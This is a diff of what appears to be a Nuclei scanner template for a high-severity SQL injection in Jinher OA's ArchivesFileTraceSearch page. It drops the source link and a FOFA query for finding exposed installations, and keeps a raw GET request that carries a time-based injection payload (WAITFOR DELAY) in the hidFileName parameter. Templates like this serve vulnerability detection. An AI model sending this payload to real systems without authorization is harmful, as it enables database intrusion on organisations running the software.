@@ -3,12 +3,8 @@ info:
   name: 金和OA ArchivesFileTraceSearch 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ydxabego9tpdtlbl'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ydxabego9tpdtlbl
-    fofa: title="金和协同管理平台" || body="js/PasswordCommon.js" || body="js/PasswordNew.js" || body="Jinher Network" || (body="c6/Jhsoft.Web.login" && body="CloseWindowNoAsk") || header="Path=/jc6" || (body="JC6金和协同管
 http:
 - raw:
   - GET /C6/JHSoft.Web.Archives/ArchivesFileTraceSearch.aspx/?hidFileName=1222222222';WAITFOR+DELAY+'0:0:5'--+---- HTTP/1.1
